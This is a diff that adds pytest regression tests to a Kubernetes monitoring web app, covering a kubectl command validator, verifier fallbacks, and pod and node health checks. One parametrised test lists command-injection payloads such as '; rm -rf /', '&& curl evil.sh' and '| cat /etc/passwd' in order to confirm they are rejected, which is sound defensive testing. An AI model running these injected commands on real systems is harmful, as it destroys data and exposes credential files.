@@ -713,3 +713,234 @@ class TestTargetExecuteResolveEndpoint:
         event = web._store.get_event(eid)
         assert event["source"] == "kubernetes"
         assert event["status"] == "resolved"
+
+
+# ── TestCodeRabbitFixes ────────────────────────────────────────────────────
+#
+# Regression coverage for the hardening pass that followed the first
+# CodeRabbit review on PR #41. Each test pins one finding so a future
+# refactor can't silently re-introduce the defect.
+
+
+class TestShellMetacharRejection:
+    """`_validate_kubectl_command` must reject any shell metacharacter
+    that would let operator input escape `kubectl` and run arbitrary
+    shell via tools/base.run_command's shell=True path."""
+
+    @pytest.mark.parametrize("tail", [
+        "; rm -rf /",
+        " && curl evil.sh",
+        " || echo pwned",
+        " | cat /etc/passwd",
+        " > /tmp/out",
+        " < /etc/shadow",
+        " `whoami`",
+        " $(id)",
+        "\nrm -rf /",
+    ])
+    def test_shell_metacharacters_rejected(self, app_with_execute, tail):
+        web, c = app_with_execute
+        eid = _seed_event(web)
+        _login_admin(c, web)
+        bad = f"kubectl delete pod x -n demo{tail}"
+        r = c.post(f"/api/v1/events/{eid}/execute", json={"command": bad})
+        assert r.status_code == 400, r.get_json()
+        body = r.get_json()
+        assert "shell metacharacters" in (body.get("error") or "").lower()
+
+    def test_plain_command_passes_metachar_check(self, app_with_execute):
+        """Without metacharacters the validator falls through to the
+        existing verb allowlist, so a well-formed kubectl still works."""
+        web, c = app_with_execute
+        eid = _seed_event(web)
+        _login_admin(c, web)
+        web._tools.execute.side_effect = lambda _t, cmd: (
+            "Running|0" if "get pod crashloop" in cmd else "pod deleted"
+        )
+        with patch("monitor.verify.time.sleep", lambda _s: None):
+            r = c.post(
+                f"/api/v1/events/{eid}/execute",
+                json={"command": "kubectl delete pod crashloop -n demo"},
+            )
+        assert r.status_code == 200, r.get_json()
+
+
+class TestTargetNameOnDashboardResolve:
+    """The Dashboard endpoint used `getattr(target, 'name', ...)` but
+    TargetManager.get() returns a dict — so new user-initiated events
+    inherited the id as their display name. History then rendered `t1`
+    instead of `demo-cluster`, which is confusing in a multi-target UI."""
+
+    def test_dashboard_resolve_uses_target_display_name(self, app_with_execute):
+        web, c = app_with_execute
+        _login_admin(c, web)
+
+        def fake_exec(_target, cmd: str) -> str:
+            if "get pod fresh" in cmd:
+                return "Running|0"
+            return "ok"
+        web._tools.execute.side_effect = fake_exec
+
+        with patch("monitor.verify.time.sleep", lambda _s: None):
+            r = c.post(
+                "/api/v1/targets/t1/execute-resolve",
+                json={"object": "pod/fresh", "namespace": "demo",
+                      "reason": "CrashLoopBackOff",
+                      "command": "kubectl delete pod fresh -n demo"},
+            )
+        assert r.status_code == 200, r.get_json()
+        new_eid = r.get_json()["event_id"]
+        event = web._store.get_event(new_eid)
+        # Must come from target["name"], not fall back to the id.
+        assert event["target_name"] == "demo-cluster"
+
+
+class TestVerifierCrashFallbackShape:
+    """When verify_resolution() throws, the JSON response must still
+    carry the full VerificationResult.to_dict() shape — the frontend
+    result panel reads reason/predicate/final_state unconditionally."""
+
+    def test_fallback_matches_normal_shape(self, app_with_execute):
+        web, c = app_with_execute
+        eid = _seed_event(web)
+        _login_admin(c, web)
+
+        web._tools.execute.side_effect = lambda _t, _cmd: "pod deleted"
+
+        def boom(*_a, **_kw):
+            raise RuntimeError("verifier internals broke")
+
+        with patch("ui.web.verify_resolution", side_effect=boom):
+            r = c.post(
+                f"/api/v1/events/{eid}/execute",
+                json={"command": "kubectl delete pod crashloop -n demo"},
+            )
+        assert r.status_code == 200
+        v = r.get_json()["verification"]
+        # The contract the UI relies on:
+        for k in ("success", "reason", "predicate",
+                  "attempts", "duration_s", "final_state", "note"):
+            assert k in v, f"missing field {k!r} in verifier-crash fallback"
+        assert v["success"] is False
+        assert "verifier crashed" in v["note"]
+
+
+class TestDeletePodSelectorCapture:
+    """delete-pod remediation must pivot from by-name polling to by-label
+    polling — a ReplicaSet-owned pod is replaced with a new generated
+    name, and the by-name probe would just time out on the old name."""
+
+    def test_probes_by_selector_when_pod_has_template_hash(self, app_with_execute):
+        web, c = app_with_execute
+        eid = _seed_event(web)
+        _login_admin(c, web)
+
+        calls: list[str] = []
+
+        def fake_exec(_target, cmd: str) -> str:
+            calls.append(cmd)
+            if "pod-template-hash" in cmd and ".metadata.labels" in cmd:
+                # Capture phase: pod is ReplicaSet-owned.
+                return "7c6d9f"
+            if cmd.startswith("kubectl delete "):
+                return "pod \"crashloop\" deleted"
+            if "-l pod-template-hash=7c6d9f" in cmd:
+                # Selector-based verification probe.
+                return "Running|0"
+            return ""
+
+        web._tools.execute.side_effect = fake_exec
+
+        with patch("monitor.verify.time.sleep", lambda _s: None):
+            r = c.post(
+                f"/api/v1/events/{eid}/execute",
+                json={"command": "kubectl delete pod crashloop -n demo"},
+            )
+        assert r.status_code == 200, r.get_json()
+        body = r.get_json()
+        assert body["final_status"] == "resolved"
+        # Verifier actually used the selector path — we'd never reach
+        # this without the by-label probe firing.
+        assert any("-l pod-template-hash=7c6d9f" in c for c in calls), (
+            "verifier must have used the label-selector probe"
+        )
+
+    def test_invalid_hash_output_falls_back_to_by_name(self, app_with_execute):
+        """When the capture probe returns noise (executor error string,
+        truncated output, garbage), we must NOT build a corrupt selector
+        — the validator requires a real pod-template-hash shape."""
+        web, c = app_with_execute
+        eid = _seed_event(web)
+        _login_admin(c, web)
+
+        calls: list[str] = []
+
+        def fake_exec(_target, cmd: str) -> str:
+            calls.append(cmd)
+            if "pod-template-hash" in cmd and ".metadata.labels" in cmd:
+                # Garbage capture output — must be discarded, not used.
+                return "Error from server (NotFound): pods \"crashloop\" not found"
+            if cmd.startswith("kubectl delete "):
+                return "pod deleted"
+            if "get pod crashloop" in cmd:
+                return "Running|0"
+            return ""
+
+        web._tools.execute.side_effect = fake_exec
+
+        with patch("monitor.verify.time.sleep", lambda _s: None):
+            r = c.post(
+                f"/api/v1/events/{eid}/execute",
+                json={"command": "kubectl delete pod crashloop -n demo"},
+            )
+        assert r.status_code == 200, r.get_json()
+        # Must have reverted to the by-name probe, not used the garbage
+        # string as a selector.
+        assert not any("-l " in c for c in calls), (
+            "invalid hash must disable selector path"
+        )
+
+
+class TestNodeAdditionalConditions:
+    """_NODE_REASONS routes NetworkUnavailable and OutOfDisk through
+    _probe_node_ready / _is_healthy_node. The probe+predicate must
+    actually observe those conditions — otherwise the verifier flips
+    to success the moment Ready returns True, even with the offending
+    condition still asserted."""
+
+    def test_network_unavailable_blocks_healthy(self):
+        from monitor.verify import _is_healthy_node
+        out = ("Ready=True Mem=False Disk=False PID=False "
+               "Net=True OutOfDisk=False")
+        assert _is_healthy_node(out, None) is False
+
+    def test_out_of_disk_blocks_healthy(self):
+        from monitor.verify import _is_healthy_node
+        out = ("Ready=True Mem=False Disk=False PID=False "
+               "Net=False OutOfDisk=True")
+        assert _is_healthy_node(out, None) is False
+
+    def test_all_conditions_false_is_healthy(self):
+        from monitor.verify import _is_healthy_node
+        out = ("Ready=True Mem=False Disk=False PID=False "
+               "Net=False OutOfDisk=False")
+        assert _is_healthy_node(out, None) is True
+
+    def test_network_unavailable_verifier_end_to_end(self):
+        """An event with reason=NetworkUnavailable must stay unhealthy
+        until Net=False, not just until Ready=True."""
+        clk = _VirtualClock()
+        # Stays in Ready-but-Net-still-unavailable forever → timeout.
+        exec_fn = _ScriptedExecutor({
+            "get node n9": [
+                "Ready=True Mem=False Disk=False PID=False "
+                "Net=True OutOfDisk=False",
+            ],
+        })
+        event = {"reason": "NetworkUnavailable", "object": "node/n9"}
+        r = verify_resolution(
+            exec_fn, event,
+            timeout_s=20, poll_interval_s=5, stability_window_s=10,
+            sleep_fn=clk.sleep, clock_fn=clk.time,
+        )
+        assert r.success is False
